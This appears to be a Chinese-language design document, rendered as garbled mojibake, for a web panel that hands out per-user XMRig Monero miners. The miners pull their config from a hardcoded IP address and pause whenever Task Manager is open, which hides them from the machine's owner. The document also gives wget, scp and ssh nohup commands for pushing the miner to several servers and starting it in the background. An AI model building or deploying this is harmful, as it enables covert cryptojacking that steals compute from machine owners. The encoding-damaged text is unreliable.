# å®Œæ•´çš„ç”¨æˆ·ç®¡ç†ç³»ç»Ÿè§£å†³æ–¹æ¡ˆ

## ğŸ¯ ç³»ç»Ÿæ¶æ„

### æ•´ä½“æµç¨‹
```
ç”¨æˆ·æ³¨å†Œ â†’ é…ç½®å‚æ•° â†’ ä¸‹è½½ä¸“å±ç¨‹åº â†’ è‡ªåŠ¨è¿è¡Œ
```

## ğŸ“Š ç³»ç»Ÿç»„æˆ

### 1. Webç®¡ç†ç³»ç»Ÿ
- **ç”¨æˆ·æ³¨å†Œ/ç™»å½•** - å¸¦éªŒè¯ç çš„å®‰å…¨è®¤è¯
- **é…ç½®ç®¡ç†** - ç”¨æˆ·è®¾ç½®é’±åŒ…åœ°å€ã€CPUå‚æ•°ç­‰
- **ç¨‹åºä¸‹è½½** - æ ¹æ®ç”¨æˆ·åç”Ÿæˆä¸“å±ç¨‹åº
- **APIæ¥å£** - æä¾›é…ç½®è·å–æœåŠ¡

### 2. XMRigçŸ¿å·¥ç¨‹åº
- **æ™ºèƒ½è¯†åˆ«** - æ ¹æ®ç¨‹åºåè‡ªåŠ¨è·å–é…ç½®
- **é›¶é…ç½®å¯åŠ¨** - æ— éœ€æœ¬åœ°é…ç½®æ–‡ä»¶
- **è‡ªåŠ¨æ›´æ–°** - æ¯æ¬¡å¯åŠ¨è·å–æœ€æ–°é…ç½®

## ğŸš€ ä½¿ç”¨æµç¨‹

### ç”¨æˆ·ç«¯æ“ä½œ

#### 1. æ³¨å†Œè´¦å·
```
è®¿é—®: http://your-domain.com/register.php
è¾“å…¥: ç”¨æˆ·åã€é‚®ç®±ã€å¯†ç 
```

#### 2. é…ç½®å‚æ•°
ç™»å½•ååœ¨ç”¨æˆ·é¢æ¿è®¾ç½®ï¼š
- é’±åŒ…åœ°å€
- CPUä½¿ç”¨ç‡
- è¿›ç¨‹ç›‘æ§åˆ—è¡¨
- çª—å£ç›‘æ§åˆ—è¡¨

#### 3. ä¸‹è½½ç¨‹åº
```
è®¿é—®: ç”¨æˆ·ä¸­å¿ƒ â†’ ä¸‹è½½é¡µé¢
é€‰æ‹©: Windows/Linux/macOSç‰ˆæœ¬
ä¸‹è½½: username.exe (è‡ªåŠ¨å‘½åä¸ºç”¨æˆ·å)
```

#### 4. è¿è¡Œç¨‹åº
```bash
# Windows
åŒå‡» username.exe

# Linux/macOS
chmod +x username
./username
```

## ğŸ”§ æŠ€æœ¯å®ç°

### APIæ¥å£

#### é…ç½®è·å–API
```
GET http://your-domain.com/api/user_config.php?user={username}
```

è¿”å›JSONæ ¼å¼é…ç½®ï¼š
```json
{
    "pools": [{
        "url": "pool.address:3333",
        "user": "wallet.username",
        "pass": "x"
    }],
    "cpu": {
        "enabled": true,
        "max-threads-hint": 70
    },
    "cpu-high-pause": 95,
    "cpu-low-resume": 30,
    "process-pause-names": "taskmgr.exe",
    "window-pause-names": "ä»»åŠ¡ç®¡ç†å™¨"
}
```

### XMRigé…ç½®URLç”Ÿæˆè§„åˆ™

```cpp
// ç¨‹åºå â†’ API URL
username â†’ http://182.92.97.16:8181/api/user_config.php?user=username
john123 â†’ http://182.92.97.16:8181/api/user_config.php?user=john123
test â†’ http://182.92.97.16:8181/api/user_config.php?user=test
```

## ğŸ“ æ–‡ä»¶ç»“æ„

### Webç³»ç»Ÿ
```
web-manager/
â”œâ”€â”€ api/
â”‚   â”œâ”€â”€ user_config.php      # ç”¨æˆ·é…ç½®API
â”‚   â””â”€â”€ get_config.php        # å…¼å®¹æ—§ç‰ˆAPI
â”œâ”€â”€ user/
â”‚   â”œâ”€â”€ index.php            # ç”¨æˆ·ä¸­å¿ƒ
â”‚   â”œâ”€â”€ download.php         # ä¸‹è½½é¡µé¢
â”‚   â””â”€â”€ get_miner.php        # ç¨‹åºä¸‹è½½å¤„ç†
â”œâ”€â”€ admin/
â”‚   â””â”€â”€ index.php            # ç®¡ç†åå°
â”œâ”€â”€ login.php                # ç™»å½•é¡µé¢
â”œâ”€â”€ register.php             # æ³¨å†Œé¡µé¢
â””â”€â”€ config.php               # ç³»ç»Ÿé…ç½®
```

### æ•°æ®åº“ç»“æ„
```sql
users                 # ç”¨æˆ·è¡¨
user_configs         # ç”¨æˆ·é…ç½®è¡¨
coins                # å¸ç§è¡¨
coin_fields          # å¸ç§å­—æ®µé…ç½®
config_access_logs   # é…ç½®è®¿é—®æ—¥å¿—
download_logs        # ä¸‹è½½æ—¥å¿—
```

## ğŸ’¡ é«˜çº§åŠŸèƒ½

### 1. æ‰¹é‡éƒ¨ç½²
ä¸€ä¸ªç”¨æˆ·å¯ä»¥åœ¨å¤šå°æœºå™¨ä¸Šä½¿ç”¨åŒä¸€ä¸ªç¨‹åºï¼š
```bash
# ä¸‹è½½ä¸€æ¬¡
wget http://your-domain.com/user/get_miner.php?os=linux&user=john -O john

# å¤åˆ¶åˆ°å¤šå°æœºå™¨
scp john server1:/opt/
scp john server2:/opt/
scp john server3:/opt/

# æ¯å°æœºå™¨ä¸Šè¿è¡Œ
ssh server1 "cd /opt && chmod +x john && nohup ./john &"
ssh server2 "cd /opt && chmod +x john && nohup ./john &"
ssh server3 "cd /opt && chmod +x john && nohup ./john &"
```

### 2. é…ç½®å®æ—¶æ›´æ–°
ç”¨æˆ·ä¿®æ”¹é…ç½®åï¼Œåªéœ€é‡å¯ç¨‹åºå³å¯ç”Ÿæ•ˆï¼š
```bash
# ä¿®æ”¹é…ç½®å
killall john
./john
# æ–°é…ç½®è‡ªåŠ¨ç”Ÿæ•ˆ
```

### 3. å¤šç”¨æˆ·ç®¡ç†
ç®¡ç†å‘˜å¯ä»¥ï¼š
- æŸ¥çœ‹æ‰€æœ‰ç”¨æˆ·
- ä¿®æ”¹ç”¨æˆ·é…ç½®
- ç¦ç”¨/å¯ç”¨ç”¨æˆ·
- æŸ¥çœ‹ä¸‹è½½å’Œè®¿é—®æ—¥å¿—

## ğŸ”’ å®‰å…¨ç‰¹æ€§

1. **ç”¨æˆ·è®¤è¯** - ç™»å½•éªŒè¯ï¼Œé˜²æ­¢æœªæˆæƒè®¿é—®
2. **éªŒè¯ç ** - é˜²æ­¢æš´åŠ›ç ´è§£
3. **æ–‡ä»¶åæ¸…ç†** - é˜²æ­¢è·¯å¾„æ³¨å…¥æ”»å‡»
4. **è®¿é—®æ—¥å¿—** - è®°å½•æ‰€æœ‰é…ç½®è®¿é—®å’Œä¸‹è½½
5. **æƒé™æ§åˆ¶** - ç”¨æˆ·åªèƒ½ä¸‹è½½è‡ªå·±çš„ç¨‹åº

## ğŸ“Š ç›‘æ§å’Œç»Ÿè®¡

### ç”¨æˆ·ç«¯æŸ¥çœ‹
- ä¸‹è½½æ¬¡æ•°
- æœ€åè®¿é—®æ—¶é—´
- é…ç½®è·å–è®°å½•

### ç®¡ç†ç«¯æŸ¥çœ‹
- æ´»è·ƒç”¨æˆ·æ•°
- æ€»ä¸‹è½½é‡
- é…ç½®è®¿é—®é¢‘ç‡
- å¼‚å¸¸è®¿é—®æ£€æµ‹

## ğŸš€ éƒ¨ç½²æ­¥éª¤

### 1. éƒ¨ç½²Webç³»ç»Ÿ
```bash
# 1. ä¸Šä¼ web-manageråˆ°æœåŠ¡å™¨
# 2. å¯¼å…¥æ•°æ®åº“
mysql -u root -p < install.sql
mysql -u root -p < install_update.sql

# 3. é…ç½®config.php
define('DB_NAME', 'xmrig_manager');
define('DB_USER', 'your_db_user');
define('DB_PASS', 'your_db_pass');
define('SITE_URL', 'http://your-domain.com');

# 4. è®¾ç½®æƒé™
chmod 755 -R /path/to/web-manager
```

### 2. ç¼–è¯‘XMRig
```bash
cd /workspace/build
make -j4
cp xmrig /path/to/web-manager/miners/xmrig-linux
```

### 3. æµ‹è¯•ç³»ç»Ÿ
```bash
# æ³¨å†Œç”¨æˆ·
# é…ç½®å‚æ•°
# ä¸‹è½½ç¨‹åº
# è¿è¡Œæµ‹è¯•
```

## âœ… å®Œæ•´ç‰¹æ€§åˆ—è¡¨

### å·²å®ç°
- [x] ç”¨æˆ·æ³¨å†Œ/ç™»å½•ç³»ç»Ÿ
- [x] éªŒè¯ç ä¿æŠ¤
- [x] ç”¨æˆ·é…ç½®ç®¡ç†
- [x] åŠ¨æ€ç¨‹åºç”Ÿæˆ
- [x] æ ¹æ®ç¨‹åºåè·å–é…ç½®
- [x] APIæ¥å£
- [x] ä¸‹è½½æ—¥å¿—
- [x] è®¿é—®æ—¥å¿—
- [x] ç®¡ç†å‘˜åå°
- [x] å¤šå¹³å°æ”¯æŒ

### å¯æ‰©å±•
- [ ] é‚®ä»¶é€šçŸ¥
- [ ] ä¸¤æ­¥éªŒè¯
- [ ] é…ç½®æ¨¡æ¿
- [ ] å®æ—¶ç›‘æ§
- [ ] æ”¶ç›Šç»Ÿè®¡
- [ ] è‡ªåŠ¨æ›´æ–°

## ğŸ¯ æ€»ç»“

è¿™ä¸ªå®Œæ•´çš„è§£å†³æ–¹æ¡ˆå®ç°äº†ï¼š

1. **ç”¨æˆ·å‹å¥½** - ç®€å•æ³¨å†Œï¼Œä¸€é”®ä¸‹è½½
2. **é›¶é…ç½®** - ç¨‹åºè‡ªåŠ¨è·å–é…ç½®
3. **é›†ä¸­ç®¡ç†** - æœåŠ¡å™¨ç«¯ç»Ÿä¸€æ§åˆ¶
4. **çµæ´»éƒ¨ç½²** - æ”¯æŒæ‰¹é‡éƒ¨ç½²
5. **å®‰å…¨å¯é ** - å®Œå–„çš„è®¤è¯å’Œæ—¥å¿—

ç”¨æˆ·åªéœ€è¦ï¼š
1. æ³¨å†Œè´¦å·
2. è®¾ç½®é…ç½®
3. ä¸‹è½½ç¨‹åº
4. è¿è¡Œå³å¯

ç¨‹åºä¼šæ ¹æ®æ–‡ä»¶åè‡ªåŠ¨è¯†åˆ«ç”¨æˆ·èº«ä»½å¹¶è·å–å¯¹åº”é…ç½®ï¼